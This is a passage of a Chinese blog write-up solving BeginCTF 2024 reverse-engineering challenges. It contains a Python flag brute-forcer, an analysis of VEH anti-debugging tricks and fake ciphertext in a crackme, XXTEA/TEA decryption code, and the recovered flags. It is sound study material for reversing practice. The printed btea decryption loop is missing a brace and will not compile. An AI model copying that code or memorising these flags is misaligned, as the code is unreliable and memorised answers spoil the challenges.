class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">for</span> i, lst <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data): <span class="hljs-comment">#i是索引，lst是子序列（每一行）</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>): <span class="hljs-comment">#爆破有效字符</span><br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> lst]), <span class="hljs-number">2</span>) <span class="hljs-comment">#把每一行的数字连起来变成二进制，再转换为十进制</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>((j &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - i ^ key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>)) == n: <br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#begin&#123;Y@u_aRe_g00d_aT_play1ng_witH_sNake3&#125;</span><br></code></pre></td></tr></table></figure><h2 id="not-main-1"><a href="#not-main-1" class="headerlink" title="not_main-1"></a>not_main-1</h2><p>main函数有个tea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707979757333-dd70d300-8f41-4934-97c5-921e8ef1f5e4.png" class="" title="img"><p>有veh反调试</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983479051-7c947081-579d-4590-bb07-b86fc9e0967c.png" class="" title="img"><p>本题通过实现一个全局类让程序在main函数之前就执行类的构造函数，在main函数结束后执行类的析构函数</p><p>构造函数中veh定义了int 3断点和除0异常的处理方法</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983700530-4022be77-f4f3-4fdf-a263-24924734409b.png" class="" title="img"><p>int3断点的处理逻辑是，当前程序在main函数中会执行事先放置的int3，此时如果在未调试的情况下，程序将异常交给veh处理，将一个dword_405038赋值为0. 如果是调试情况下将异常交给调试器处理，如果此时调试器处理异常则不会交给veh，则dword_405038为1.main函数接下来会对输入进行虚假的判断。在判断后进入到析构函数中</p><p>析构函数会根据先前的dword_405038即图中的is_debug变量的值判断是否除零。除零进入到veh handler的除零异常处理块中</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983982520-4d2801b1-229a-422d-8b24-2c64b30ea358.png" class="" title="img"><p>后面是标准的xxtea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984388378-1e345bb4-f09f-4285-83fc-efa6d238560d.png" class="" title="img"><p>在start里找到关键函数</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984893642-f220056c-1fb1-4d5e-bcf5-f138b4ee0eb9.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985056980-3934cacd-2209-4dda-a2cd-a82c76d9b4f7.png" class="" title="img"><p>第三个参数可以看到两个疑似密文的地址</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985106747-98b4b2d8-0f60-4dc3-8e84-33c0f5d41585.png" class="" title="img"><p>unk_485018引用分别在Handler和main，有可能是main里的假密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985207681-f34fa9c4-7d5d-4ca3-952b-2dfe7c43ca5b.png" class="" title="img"><p>第四个则会触发Handler</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985133208-40cbe056-87dd-4f91-8185-84f1377121ba.png" class="" title="img"><p>Handler内的unk_485018引用则再次进行了这个操作，也就是说等于没异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985328408-88d4bf17-7681-47c2-80ba-82336264feda.png" class="" title="img"><p>所以如果真逻辑在Handler内，unk_485018就是没用的数据，真正的密文就是unk_48503C</p><p>可以以这种方式取数据</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985438972-3538b599-c7f5-4324-8f09-f2c6300fc9d4.png" class="" title="img"><p>发现调用Handler在main之前</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985562001-4455721c-e62b-4e6c-b2cb-5509d2010e13.png" class="" title="img"><p>可以看到main当中的明文是从Handler中引用的，可能XXTEA之后又进行了TEA</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985501920-3c7dc036-300b-498f-83f8-705596327bdf.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2)+(y&gt;</span>&gt;3^z&lt;&lt;4))^((sum^y)+(key[(p&amp;3)^e]^z)))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<span class="hljs-comment">//这里可以说是预定义值，n=2是rounds=32</span><br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)      <br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;       <br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)    <br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;    <br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">detea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">8</span>] = &#123; <span class="hljs-number">0xCFBE0F1B</span>, <span class="hljs-number">0x05F3083F</span>, <span class="hljs-number">0x4220E43B</span>, <span class="hljs-number">0x3383AFEE</span>, <span class="hljs-number">0xFA3237CE</span>, <span class="hljs-number">0xECADA66E</span>, <span class="hljs-number">0xA8D47CA7</span>, <span class="hljs-number">0xEFC51077</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span> &#125;;<span class="hljs-comment">//true</span><br>    <span class="hljs-type">uint32_t</span> fk[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x66</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x65</span> &#125;;<span class="hljs-comment">//fake</span><br>    <span class="hljs-type">int</span> i, n = <span class="hljs-number">8</span>;<br>    btea(v, -n, k);<span class="hljs-comment">//负号是解密</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)<br>        detea(v + i, fk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//begin&#123;not_main_is_matter!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="出题人的密码-1"><a href="#出题人的密码-1" class="headerlink" title="出题人的密码-1"></a>出题人的密码-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121166054-454a20dc-fc79-4173-b3b9-c0ade38d93b4.png" class="" title="img"><p>有花指令，按官方wp的方法去花指令</p><p>call指令按u，下一行按c，再nop call，把90转为数据，再按c变为nop</p><img 